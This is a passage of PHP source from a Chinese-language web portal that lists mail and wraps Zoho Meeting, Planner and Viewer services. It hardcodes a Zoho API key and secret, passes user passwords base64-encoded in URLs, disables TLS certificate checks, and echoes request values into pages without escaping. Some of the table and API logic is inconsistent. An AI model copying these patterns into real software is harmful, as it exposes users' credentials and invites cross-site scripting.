                                $EmailTime = urldecode(iconv('utf-8','gb2312',$objHdd->getElementsByTagName('EmailTime')->item(0)->nodeValue));
                                $PosID = urldecode(iconv('utf-8','gb2312',$objHdd->getElementsByTagName('PosID')->item(0)->nodeValue));
                                $EmailSize = urldecode(iconv('utf-8','gb2312',$objHdd->getElementsByTagName('EmailSize')->item(0)->nodeValue));
                                $MsgID = urldecode(iconv('utf-8','gb2312',$objHdd->getElementsByTagName('MsgID')->item(0)->nodeValue));
                                echo  $PosID;
                        ?>
                </td>
                <td align="center">
                                <?php echo "<a style='color:#000000' href='".ScriptPath()."?api=byban&action=".encodeuri("mail.list")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page)."&skin=".$skincolor."&EncryInfo=".encodeuri($EncryInfo)."&EncryptUserInfo=".encodeuri($EncryptUserInfo)."&MsgID=".$MsgID."&MSize=".$EmailSize."&ID=".$PosID."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."'>".$EmailSubject."</a> ";?>
                </td>
                <td align="center">
                                <?php echo $FromEmail;?>
                </td>
                <td align="center">
                                <?php  if ($EmailSize/1000 > 1000) { echo  ($EmailSize/1000000)."M";} else {echo  ($EmailSize/1000)."K";}?>B
                </td>
                <td align="center">
                                <a style="color:#000000" href="<?php echo ScriptPath()."?api=picasa&action=".encodeuri("album.edit")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."&albumid=".encodeuri($albumid)."&albumtitle=".encodeuri($albumname)."&albumsummary=".encodeuri($albumsummary)."&albumlocation=".encodeuri($albumlocation)."&albumkeywords=".encodeuri($albumkeywords)."&albumaccess=".encodeuri($albumaccess)."&albumcommentingEnabled=".encodeuri($albumcommentingEnabled);?>">编辑</a> <a style="color:#000000" href="<?php echo ScriptPath()."?api=picasa&action=".encodeuri("album.remove")."&authclientLogin=".encodeuri(trim(request("authclientLogin")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&albumid=".encodeuri($albumid)."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING']);?>">删除</a>
                </td>
        </tr>   
                        <?php 
                        }
                        ?>
                </td>
        </tr>
</table><table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                        <?php 
                        echo $page." 页 ".$sCrLf;
                        if (floor($page)>1)
                                echo "<a style='color:#000000' href='".ScriptPath()."?api=byban&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&page=".($page-1)."&skin=".$skincolor."&EncryInfo=".encodeuri($EncryInfo)."&EncryptUserInfo=".encodeuri($EncryptUserInfo)."&email=".encodeuri(trim(request("email")))."'>上一页</a> ";
                        if (floor($page)>0 && floor($page)<floor($totalpage))
                                echo "<a style='color:#000000' href='".ScriptPath()."?api=byban&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&page=".($page+1)."&skin=".$skincolor."&EncryInfo=".encodeuri($EncryInfo)."&EncryptUserInfo=".encodeuri($EncryptUserInfo)."&email=".encodeuri(trim(request("email")))."'>下一页</a> ";

                        $gotopage = New PageChange();
                        $gotopage->CallPageChange();
                        ?>
                </td>
        </tr>   
</table>
<?php 
                        $gotopage->gotopage($totalpage,ScriptPath()."?api=byban&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&EncryInfo=".encodeuri($EncryInfo)."&EncryptUserInfo=".encodeuri($EncryptUserInfo)."&email=".encodeuri(trim(request("email")))."&gopage=ok&page=","X3193","请在空白处输入要转到的页数");
      break;
        case "mail.search":
      break;
        case "mail.show":
      break;
        case "mail.attach":
      break;
        case "mail.attach.transform":
      break;
        case "mail.addaccount":
      break;
        case "mail.check":
      break;
        case "html.transform":
      break;
        case "image.transform":
      break;
        default:
                $style = new css();
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="40">
                <td align="center">
                        <form action="<?php echo ScriptPath()?>?api=byban&skin=<?php echo $skincolor;?>&action=<?php echo encodeuri("mailbox.list");?>" method="post" name="imap">
                        &nbsp用户名：<input type="text" class="text" name="uname" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>>  
                        &nbsp密码：<input type="password" class="text" name="pwd" value="" style="height:20px;width:12%;font-size:11px" <?php  $style->textarea("#FCFC9D","") ?>> 
                        &nbsp验证码：<input <?php echo $style->textarea("#FCFC9D","") ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
                break;
}
$style->footer();               
}
?>

<?php 
function zoho(){
header('Content-Type: text/html; charset=gb2312');

?>
<head>
<?php 
$style = new css();
$style->ico();
switch (trim(request('action'))) {  // case start
        case "meeting":
                                $style->title("X3193 - 会议");
        break;
        case "viewer":
                                $style->title("X3193 - 阅览");
        break;
        case "planner":
                                $style->title("X3193 - 计划");
        break;
    default:
                                $style->title("X3193 - 会议");
                break;          
}
$skincolor = selstyle(trim(request("skin")));
$sCrLf = chr(13) . chr(10); // 回车 + 换行
?>

<table width="100%" height="100%" align="center" valign="center">
        <tr>
                <td align="center" valign="middle">
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr>
                <td align="left" style="border:0">
                <?php  selskin(); ?>
                </td>
                <td align="right" style="border:0">             
                        <?php  
                        IF(!is_wap())
                        	sellink("主页|插件|搜索|地球|域名|相册|网址|FTP|读书|邮箱|游戏|邮件|短片|股票|VPN",$skincolor);
                        else
                        	sellink("主页|搜索|域名|相册|网址|FTP|邮箱|邮件|短片",$skincolor);
                        	
                        ?>
                </td>
        </tr>           
</table>
<table width="95%" height="3" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF">
        <tr>
                <td align="left">
                        
                </td>
        </tr>   
</table>
<?php 

// 每页条数
if (trim(request('pagesize')) == "")
        $pagesize = 30;
elseif (trim(request('pagesize')) > 50)
        $pagesize = 50;
else
        $pagesize = trim(request('pagesize'));

$stract = trim(request("action"));

if (trim(request("page")) != "" && is_numeric(trim(request("page"))) !== false){
        $page = floor(trim(request("page")));
}       
else{
        $page = floor("1");
}

$ZohoAPIKey = '4954dd0621efb3c4a8901f74d010006a';
$Secretkey = 'b78e83e991b64ebc3376f77c52b9844e';

$tag = New TagAction(); 
switch (trim(request('action'))) {  // case start
        case "home":
                                if (trim($_POST["uname"]) != "" && trim($_POST["pwd"]) != ""){
                                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                                if (trim(request("checkcode")) != ""){
                                                        AlertBack("四位验证码错误！" , 1);
                                                        break;
                                                }       
                                                elseif (trim(request("checkcode")) == ""){
                                                        AlertBack("四位验证码为空！" , 1);
                                                        break;
                                                }               
                                        }
                                        redirect(scriptpath()."?api=zoho&action=home&act=".encodeuri(trim(request('act')))."&skin=".$skincolor."&uname=".encodeuri(Base64_encode(trim($_POST["uname"])))."&pwd=".encodeuri(Base64_encode(trim($_POST["pwd"])))."&checkcode=".trim(request("checkcode")));
                                        break;
                                }
                                elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                                        AlertBack("用户名或密码为空！" , 1);
                                        break;                                  
                                }
                                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                        $xmlstr = '# #Thu Apr 01 20:29:06 PDT 2010 '.$sCrLf.
                                                                                'GETUSERNAME=null '.$sCrLf.
                                                                                'WARNING=null '.$sCrLf.
                                                                                'PASS_EXPIRY=-1 '.$sCrLf.
                                                                                'TICKET=5767ef44382712202e432d57da576b34 '.$sCrLf.
                                                                                'RESULT=TRUE';
                                }       
                                else{                   
                                        $url = "https://accounts.zoho.com/login";
                                        $data = array(
                                                'servicename' => "X3193-Zoho-Meeting",
                                                'FROM_AGENT' => "True",
                                                'LOGIN_ID' => Base64_decode(trim(request("uname"))),
                                                'PASSWORD' => Base64_decode(trim(request("pwd")))
                                        ); // 经验教训 ：数组中的数值不能用URLENCODE
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                                        curl_setopt($ch, CURLOPT_POST, 1);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                        curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                                        $xmlstr = curl_exec($ch);
                                        curl_close($ch);
                                }
                                if(stripos(trim($xmlstr),"TICKET=")){
                                        $ticketid = trim(substr(trim($xmlstr),stripos(trim($xmlstr),"TICKET=")+7,stripos(trim($xmlstr),"RESULT=TRUE")-stripos(trim($xmlstr),"TICKET=")-7-1));
                                        if (trim(request('act')) == "meeting"){
                                                redirect(ScriptPath()."?api=zoho&action=".encodeuri("meeting.getMeetingList")."&skin=".$skincolor."&ticketid=".$ticketid."&uname=".encodeuri(trim(request("uname"))));                                  
                                        }       
                                        elseif (trim(request('act')) == "planner"){
                                                redirect(ScriptPath()."?api=zoho&action=".encodeuri("planner.pageList")."&skin=".$skincolor."&ticketid=".$ticketid."&uname=".encodeuri(trim(request("uname"))));                                        
                                        }
                                        elseif (trim(request('act')) == "viewer"){
                                                redirect(ScriptPath()."?api=zoho&action=".encodeuri("viewer.getdoc")."&skin=".$skincolor."&ticketid=".$ticketid."&uname=".encodeuri(trim(request("uname"))));                                   
                                        }
                                }
                                elseif(stripos(trim($xmlstr),"TICKET=")){
                                        $xmlstr = '# #Thu Apr 01 20:34:34 PDT 2010 '.$sCrLf.
                                                                                'CAUSE=Username and Password do not match '.$sCrLf.
                                                                                'RESULT=FALSE ';
                                        $cause = trim(substr(trim($xmlstr),stripos(trim($xmlstr),"CAUSE=")+6,stripos(trim($xmlstr),"RESULT=FALSE")-stripos(trim($xmlstr),"CAUSE=")-6-1));
                                        AlertBack($cause , 2);
                                        break;
                                }                               
        break;
        case "viewer":
                $style = new css();
?>
<script>
function changeimg()
{
        document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
function dofiletype(){
        if (document.getElementById("filetype").value == "local"){
                document.getElementById("filepath").innerHTML = '&nbsp文档地址：<input type="file" class="text" name="filepath" value="" style="height:20px;width:30%;font-size:11px" onmouseover="this.style.backgroundColor=\'#FCFC9D\';" onmouseout="this.style.backgroundColor=\'\';" onmousedown="this.style.backgroundColor=\'#FCFC9D\';">';
        }       
        else if(document.getElementById("filetype").value == "remote"){
                document.getElementById("filepath").innerHTML = '&nbsp文档地址：<input type="text" class="text" name="filepath" value="" style="height:20px;width:30%;font-size:11px" onmouseover="this.style.backgroundColor=\'#FCFC9D\';" onmouseout="this.style.backgroundColor=\'\';" onmousedown="this.style.backgroundColor=\'#FCFC9D\';">';
        }       
}
</script>
<table width="95%" height="" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="35" valign="center">
                <td align="center" valign="center" id="picture">
                        <form action="<?php echo ScriptPath();?>?api=zoho&action=<?php echo encodeuri('viewer.main');?>&skin=<?php  echo $skincolor;?>" method="post" name="picture">
                        <SELECT name="filetype" size="1" <?php  $style->selectarea("#FCFC9D","");?> style="width:75px;height:16px;font-size:12px" onchange="dofiletype();">
                                <OPTION VALUE="local">本地文档</OPTION>
                                <OPTION VALUE="remote">远程文档</OPTION>
                        </SELECT>
                        <span id="filepath">&nbsp文档地址：<input type="file" class="text" name="filepath" value="" style="height:20px;width:30%;font-size:11px" <?php  $style->textarea("#FCFC9D",""); ?>>  </span>
                        <span id="iconsize"></span>
                        &nbsp验证码：<input <?php  $style->textarea("#FCFC9D",""); ?> maxlength="4" name="checkcode" id="checkcode" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath();?>?api=checkcode" border="0"></a>
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>
        </tr>   
</table>
<?php 
        break;
        case "viewer.main":
                if (trim($_POST["filetype"]) != "" && trim($_POST["filepath"]) != ""){
                        If ($_SESSION['ValidCode'] != "" && $_SESSION['ValidCode'] != trim(request("checkcode"))){
                                if (trim(request("checkcode")) != ""){
                                        AlertBack("四位验证码错误！" , 1);
                                        break;
                                }       
                                elseif (trim(request("checkcode")) == ""){
                                        AlertBack("四位验证码为空！" , 1);
                                        break;
                                }               
                        }
                        redirect(scriptpath()."?api=zoho&action=".encodeuri(trim(request('action')))."&skin=".$skincolor."&checkcode=".trim(request("checkcode"))."&filepath=".encodeuri(trim(request("filepath")))."&filetype=".encodeuri(trim(request("filetype"))));
                        break;
                }
                elseif (trim(request("filepath")) == "" || trim(request("filetype")) == ""){
                        AlertBack("文件地址为空！" , 1);
                        break;                                  
                }
                $style = new css();
?>
<table width="95%" height="82%" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr align="center" style="border:0">
                <td align="center" id="zoho">
                </td>
        </tr>
</table>
<script language="JavaScript" type="text/javascript">
        document.getElementById('zoho').innerHTML = '<iframe name="zoho" tabIndex="1" title="X3193 - ZOHO - Viewer" width="100%" height="100%" border="0" id="zoho" src="https://viewer.zoho.com/api/urlview.do?url=<?php  echo encodeuri(trim(request("filepath")));?>&cache=false&embed=true" frameborder="0" scrolling="no" style="width:100%;height:100%"><iframe>'
</script>
<?php 
        break;
        case "meeting.getMeetingList":
                                if (trim(request("logout")) != ""){
                                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                                        session_register("zoho");
}                                        

                                        $_SESSION["zoho"]=array('meeting' => array('uname' => '', 'pwd' => '', 'ticketid' => ''));                                      
                                        //session_register("uname"); 
                                        //$_SESSION["uname"] = "";      
                                        //session_register("pwd"); 
                                        //$_SESSION["pwd"] = "";        
                                        //session_register("ticketid"); 
                                        //$_SESSION["ticketid"] = "";   
                                        redirect(scriptpath()."?api=zoho&skin=".$skincolor."&uname=&pwd=&urlflag=1&tickectid=".encodeuri(trim(request("tickectid"))));
                                        break;
                                }
                                elseif (trim(request('uname')) != "" && trim(request('uname')) != ""){
                                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                                        session_register("zoho");
}                                        

                                        $_SESSION["zoho"]=array('meeting' => array('uname' => trim(request("uname")), 'pwd' => trim(request("pwd")), 'ticketid' => trim(request("ticketid"))));                                 
                                        //session_register("meeting");
                                        //$_SESSION["meeting"]=array('uname' => trim(request("uname")), 'pwd' => trim(request("pwd")), 'ticketid' => trim(request("ticketid")));                                        
                                        //session_register("uname"); 
                                        //$_SESSION["uname"] = trim(request("uname"));  
                                        //session_register("pwd"); 
                                        //$_SESSION["pwd"] = trim(request("pwd"));      
                                        //session_register("ticketid"); 
                                        //$_SESSION["ticketid"] = trim(request("ticketid"));
                                }       
                                elseif ($_SESSION["zoho"]["meeting"]["uname"] != "" && $_SESSION["zoho"]["meeting"]["ticketid"] != "" && trim(request("uname")) == "" && trim(request("ticketid")) == ""){
                                        redirect(scriptpath()."?api=zoho&skin=".$skincolor."&uname=".encodeuri(trim($_SESSION["zoho"]["meeting"]["uname"]))."&action=".encodeuri(trim(request("action")))."&checkcode=".trim(request("checkcode"))."&ticketid=".encodeuri($_SESSION["zoho"]["meeting"]["ticketid"]));
                                        break;
                                }       
                                elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                                        redirect(scriptpath()."?api=zoho&skin=".$skincolor."&uname=&pwd=&checkcode=".trim(request("checkcode"))."&ticketid=".encodeuri(trim(request("ticketid"))));
                                        break;
                                }       
                                elseif (trim(request("ticketid")) == ""){
                                        redirect(scriptpath()."?api=zoho&skin=".$skincolor."&uname=&pwd=&ticketid=");
                                        break;
                                }  
                                        
                                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                        $xmlstr = '<?php xml version="1.0" encoding="UTF-8" ?><response xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://meeting.zoho.com/schema/api/meetinglist.xsd" uri="/api/private/xml/meetings/getMeetingList" ><result><meetings><meeting><meeting_topic>X3193</meeting_topic><meeting_date>2011-04-11 05:55</meeting_date><meeting_timezone>null</meeting_timezone><meeting_key>3283707840</meeting_key><meeting_status>Not Started</meeting_status><meeting_agenda>X3193</meeting_agenda><agent_type>prompt</agent_type><meeting_role>Presenter</meeting_role><meeting_skype>null</meeting_skype><audio><audio_type>None</audio_type></audio><meeting_presenter><emailid>xcy6272003@126.com</emailid></meeting_presenter><meeting_participants></meeting_participants></meeting><meeting><meeting_topic>X3193</meeting_topic><meeting_date>2011-04-07 22:30</meeting_date><meeting_timezone>null</meeting_timezone><meeting_key>5599771010</meeting_key><meeting_status>Not Started</meeting_status><meeting_agenda></meeting_agenda><agent_type>prompt</agent_type><meeting_role>Presenter</meeting_role><meeting_skype>null</meeting_skype><audio><audio_type>None</audio_type></audio><meeting_presenter><emailid>xcy6272003@126.com</emailid></meeting_presenter><meeting_participants></meeting_participants></meeting></meetings></result></response>';
                                }       
                                else{                   
                                        $url = "http://meeting.zoho.com/api/private/xml/meetings/getMeetingList?apikey=".$ZohoAPIKey."&ticket=".trim(request("ticketid"));
                                        //ECHO $url;
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                                        $xmlstr = curl_exec($ch);
                                        curl_close($ch);
                                }
                                //echo $xmlstr;
                                $objXml = new DOMDocument();  
                                $objXml->preserveWhiteSpace = true;
                                $objXml->async = false; 
                                $objXml->loadXML($xmlstr);
                                $objList = $objXml->getElementsByTagName("meeting");
                                //echo $objList->length;        
                                if ($objList->length > $pagesize) $strpagesize = $pagesize; else $strpagesize = $objList->length;
                                //echo $strpagesize;
                                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center" colspan="3"> 查 询 结 果 : 共 <?php  echo $objList->length;?> 条 </td>
        </tr>   
</table>                
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#000000" href="<?php echo ScriptPath()."?api=zoho&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&ticketid=".encodeuri(trim(request("ticketid")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor;?>" target=_self>用户</a> - <?php echo base64_decode(trim(request("uname")));?> ] </td>
        </tr>
</table>                
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" width=4%>
                        <input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" />
                </td>   
                <td align="center" width=25%>
                        域名值
                </td>
                <td align="center" width=10%>
                        等级
                </td> 
                <td align="center" width=10%>
                        记录数
                </td>
                <td align="center" width=25%>
                        共享来源
                </td>
                <td align="center" width=30%>
                        <a style="color:#000000" href="<?php  echo ScriptPath();?>?api=dnspod&action=<?php echo encodeuri("Domain.Create");?>&skin=<?php  echo $skincolor;?>&uname=<?php echo encodeuri(trim(request("uname")));?>&pwd=<?php  echo encodeuri(trim(request("pwd")));?><?php echo "&pagesize=".trim(request("pagesize"))."&page=".$page;?>">添加</a> 搜索 <a style="color:#000000" href="javascript:delitem();">删除</a> <a style="color:#000000" href="javascript:doitem('enable');">启</a>/<a style="color:#000000" href="javascript:doitem('disable');">停</a>
                </td> 
        </tr>           
                                <?php       
                                for($i=0; $i < $strpagesize;$i++){
                                        $objHdd = $objList->item($i);
                                        ?>              
        <tr class="tdbg">
                <td align="center" width=4%>
                        <input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" />
                </td>
                <td align="center">
                                        <?php 
                                        $meeting_topic = str_replace('"', "", iconv('utf-8','gb2312',$objHdd->getElementsByTagName("meeting_topic")->item(0)->nodeValue));
                                        $meeting_date = str_replace('"', "", iconv('utf-8','gb2312',$objHdd->getElementsByTagName('meeting_date')->item(0)->nodeValue));
                                        $meeting_timezone = str_replace('"', "", trim(iconv('utf-8','gb2312',$objHdd->getElementsByTagName('meeting_timezone')->item(0)->nodeValue)));
                                        $meeting_key = str_replace('"', "", trim(iconv('utf-8','gb2312',$objHdd->getElementsByTagName('meeting_key')->item(0)->nodeValue)));
                                        $meeting_status = str_replace('"', "", iconv('utf-8','gb2312',$objHdd->getElementsByTagName('meeting_status')->item(0)->nodeValue));
                                        $meeting_agenda = str_replace('"', "", iconv('utf-8','gb2312',$objHdd->getElementsByTagName("meeting_topic")->item(0)->nodeValue));
                                        $agent_type = str_replace('"', "", iconv('utf-8','gb2312',$objHdd->getElementsByTagName('agent_type')->item(0)->nodeValue));
                                        $meeting_role = str_replace('"', "", trim(iconv('utf-8','gb2312',$objHdd->getElementsByTagName('meeting_role')->item(0)->nodeValue)));
                                        $meeting_skype = str_replace('"', "", trim(iconv('utf-8','gb2312',$objHdd->getElementsByTagName('meeting_skype')->item(0)->nodeValue)));
                                        $audio_type = str_replace('"', "", iconv('utf-8','gb2312',$objHdd->getElementsByTagName("audio")->item(0)->getElementsByTagName("audio_type")->item(0)->nodeValue));
                                        ?>
                        域名值
                </td>
                <td align="center">
                        等级
                </td> 
                <td align="center">
                        记录数
                </td>
                <td align="center">
                        共享来源
                </td>           
                <td align="center"> 
                        <table width="95%">
                                <tr>
                                        <td align="center">
                                                <a style='color:#000000' href="#" onclick="javascript:window.external.AddFavorite('<?php  echo $nodelink; ?>','<?php  echo $nodetitle; ?>')" target=_self>收藏</a> <a style='color:#000000' href="http://api.addthis.com/oexchange/0.8/offer?url=<?php echo encodeuri($nodelink);?>&title=<?php  echo encodeuri($nodetitle);?>&description=<?php  echo encodeuri($nodedescript)?>&pubid=x3193" target=_blank>网收</a>
                                        </td>   
                                </tr>
                        </table>                        
                </td>
        </tr>   
                                        <?php                       
                                }
                                ?>
</table>                                
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                                <?php 
                                if ($objList->length > 1000){
                                        $totalitem = 1000;
                                }       
                                else{
                                        $totalitem = $objList->length;
                                }       
                                if (fmod($totalitem, $pagesize) == 0){
                                        $totalpage=$totalitem/$pagesize;
                                }       
                                else{
                                        $totalpage=ceil($totalitem/$pagesize);
                                }       
                                ?>
                <td align="center" colspan="3"> 共 <?php echo $totalpage;?> 页 第  
                                <?php 
                                echo $page." 页".$sCrlf.' ';
                                if (floor($page) > 1)
                                        echo "<a style='color:#000000' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page-1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>上一页</a> ";
                                if (floor($page) > 0 && floor($page) < floor($totalpage))
                                        echo "<a style='color:#000000' href='?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&page=".encodeuri(($page+1))."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."'>下一页</a> ";
        
                                $gotopage = New PageChange();
                                $gotopage->CallPageChange();
                        
                                ?>
                </td>
        </tr>   
</table>                        
                <?php 
                                $gotopage->gotopage($totalpage,"?Query=".encodeuri($query)."&Sources=".encodeuri($soSources)."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&transfrom=".encodeuri(trim(request('transfrom')))."&market=".encodeuri(trim(request('market')))."&gopage=ok&page=","请输入要转到的页数","请在空白处输入要转到的页数");                                                                     
        break;
        case "planner.pageList":
                                if (trim(request("logout")) != ""){
                                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                                        session_register("zoho");
}                                        

                                        $_SESSION["zoho"]=array('planner' => array('uname' => '', 'pwd' => '', 'ticketid' => ''));                                      
                                        //session_register("planner");
                                        //$_SESSION["planner"]=array('uname' => '', 'pwd' => '', 'ticketid' => '');                     
                                        //session_register("uname"); 
                                        //$_SESSION["uname"] = "";      
                                        //session_register("pwd"); 
                                        //$_SESSION["pwd"] = "";        
                                        //session_register("ticketid"); 
                                        //$_SESSION["ticketid"] = "";   
                                        redirect(scriptpath()."?api=zoho&skin=".$skincolor."&uname=&pwd=&urlflag=1&tickectid=".encodeuri(trim(request("tickectid"))));
                                        break;
                                }
                                elseif (trim(request('uname')) != "" && trim(request('uname')) != ""){
                                        session_start();
if(substr(PHP_VERSION, 0, 3)=='5.4'){
		//session_register("X3193");
}
elseif(substr(PHP_VERSION, 0, 3)=='5.3'){
                                        session_register("zoho");
} 
                                        $_SESSION["zoho"]=array('planner' =>array('uname' => trim(request("uname")), 'pwd' => trim(request("pwd")), 'ticketid' => trim(request("ticketid"))));                                  
                                        //session_register("planner");
                                        //$_SESSION["planner"]=array('uname' => trim(request("uname")), 'pwd' => trim(request("pwd")), 'ticketid' => trim(request("ticketid")));                        
                                        //session_register("uname"); 
                                        //$_SESSION["uname"] = trim(request("uname"));  
                                        //session_register("pwd"); 
                                        //$_SESSION["pwd"] = trim(request("pwd"));      
                                        //session_register("ticketid"); 
                                        //$_SESSION["ticketid"] = trim(request("ticketid"));
                                }       
                                elseif ($_SESSION["zoho"]["planner"]["uname"] != "" && $_SESSION["zoho"]["planner"]["ticketid"] != "" && trim(request("uname")) == "" && trim(request("ticketid")) == ""){
                                        redirect(scriptpath()."?api=zoho&skin=".$skincolor."&uname=".encodeuri(base64_encode(trim($_SESSION["zoho"]["planner"]["uname"])))."&action=".encodeuri(trim(request("action")))."&checkcode=".trim(request("checkcode"))."&ticketid=".encodeuri($_SESSION["zoho"]["planner"]["ticketid"]));
                                        break;
                                }       
                                elseif (trim(request("uname")) == "" || trim(request("pwd")) == ""){
                                        redirect(scriptpath()."?api=zoho&skin=".$skincolor."&uname=&pwd=&checkcode=".trim(request("checkcode"))."&ticketid=".encodeuri(trim(request("ticketid"))));
                                        break;
                                }       
                                elseif (trim(request("ticketid")) == ""){
                                        redirect(scriptpath()."?api=zoho&skin=".$skincolor."&uname=&pwd=&ticketid=");
                                        break;
                                }       
                                if (($_SERVER['SERVER_NAME'] == "localhost") || ($_SERVER['SERVER_NAME'] == "127.0.0.1")){
                                        $xmlstr = '<?php xml version="1.0" encoding="UTF-8" ?><response xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="http://meeting.zoho.com/schema/api/meetinglist.xsd" uri="/api/private/xml/meetings/getMeetingList" ><result><meetings><meeting><meeting_topic>X3193</meeting_topic><meeting_date>2011-04-07 22:30</meeting_date><meeting_timezone>null</meeting_timezone><meeting_key>5599771010</meeting_key><meeting_status>Not Started</meeting_status><meeting_agenda></meeting_agenda><agent_type>prompt</agent_type><meeting_role>Presenter</meeting_role><meeting_skype>null</meeting_skype><audio><audio_type>None</audio_type></audio><meeting_presenter><emailid>xcy6272003@126.com</emailid></meeting_presenter><meeting_participants></meeting_participants></meeting></meetings></result></response>';
                                }       
                                else{                   
                                        $url = "http://meeting.zoho.com/api/private/xml/meetings/getMeetingList?apikey=".$ZohoAPIKey."&ticket=".trim(request("ticketid"));
                                        //ECHO $url;
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HEADER, 0);
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_TIMEOUT, 150);
                                        $xmlstr = curl_exec($ch);
                                        curl_close($ch);
                                } 
                                echo $xmlstr;   
        break;
        case "viewer.getdoc":
        break;
        default:
                $style = new css();
?>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath();?>?api=checkcode&a=' + Math.random();
}
function dofiletype(){
        if (document.getElementById("act").value == "viewer"){
